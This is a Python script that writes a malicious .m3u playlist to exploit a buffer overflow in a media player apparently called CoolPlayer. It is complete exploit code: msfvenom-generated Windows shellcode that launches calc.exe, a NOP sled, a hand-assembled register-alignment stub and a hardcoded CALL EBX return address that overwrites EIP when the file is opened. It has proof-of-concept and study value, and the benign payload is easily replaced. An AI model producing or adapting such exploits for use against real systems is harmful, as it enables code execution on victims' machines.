import sys,struct

filename = "coolplayer_sploit.m3u"

# msfvenom -p windows/exec cmd=calc.exe -f python -b "\x00\x0a\x0d" -v shellcode
# Payload size: 220 bytes
shellcode =  ""
shellcode += "\xbf\xf0\xd2\xc2\x11\xda\xcf\xd9\x74\x24\xf4\x5a"
shellcode += "\x29\xc9\xb1\x31\x83\xea\xfc\x31\x7a\x0f\x03\x7a"
shellcode += "\xff\x30\x37\xed\x17\x36\xb8\x0e\xe7\x57\x30\xeb"
shellcode += "\xd6\x57\x26\x7f\x48\x68\x2c\x2d\x64\x03\x60\xc6"
shellcode += "\xff\x61\xad\xe9\x48\xcf\x8b\xc4\x49\x7c\xef\x47"
shellcode += "\xc9\x7f\x3c\xa8\xf0\x4f\x31\xa9\x35\xad\xb8\xfb"
shellcode += "\xee\xb9\x6f\xec\x9b\xf4\xb3\x87\xd7\x19\xb4\x74"
shellcode += "\xaf\x18\x95\x2a\xa4\x42\x35\xcc\x69\xff\x7c\xd6"
shellcode += "\x6e\x3a\x36\x6d\x44\xb0\xc9\xa7\x95\x39\x65\x86"
shellcode += "\x1a\xc8\x77\xce\x9c\x33\x02\x26\xdf\xce\x15\xfd"
shellcode += "\xa2\x14\x93\xe6\x04\xde\x03\xc3\xb5\x33\xd5\x80"
shellcode += "\xb9\xf8\x91\xcf\xdd\xff\x76\x64\xd9\x74\x79\xab"
shellcode += "\x68\xce\x5e\x6f\x31\x94\xff\x36\x9f\x7b\xff\x29"
shellcode += "\x40\x23\xa5\x22\x6c\x30\xd4\x68\xfa\xc7\x6a\x17"
shellcode += "\x48\xc7\x74\x18\xfc\xa0\x45\x93\x93\xb7\x59\x76"
shellcode += "\xd0\x48\x10\xdb\x70\xc1\xfd\x89\xc1\x8c\xfd\x67"
shellcode += "\x05\xa9\x7d\x82\xf5\x4e\x9d\xe7\xf0\x0b\x19\x1b"
shellcode += "\x88\x04\xcc\x1b\x3f\x24\xc5\x7f\xde\xb6\x85\x51"
shellcode += "\x45\x3f\x2f\xae"

maxlen = 5000
crash_eip = 240

nop = "\x90" * 16

# Align ESI
# ESI = 0x01EC1250, buffer = 0x01ed22b8; buffer - ESI = 0x00011068
align_esi = (   
                "\x56"                              # PUSH ESI
                "\x58"                              # POP EAX
                "\x66\x05\x34\x88"                  # ADD AX, 0x8834
                "\x66\x05\x34\x88"                  # ADD AX, 0x8834
                "\x50"                              # PUSH EAX
                "\x5e"                              # POP ESI
                "\xff\xe6"                          # JMP ESI
            )

prefix = nop
prefix += align_esi
prefix += "A" * (crash_eip - len(prefix))
eip = struct.pack("<L", 0x0048215b)                 # CALL EBX
suffix = nop
suffix += shellcode
suffix += "C" * (maxlen - len(prefix + eip + suffix))

payload = prefix + eip + suffix

f = open(filename, 'wb')
f.write(payload)
f.close()
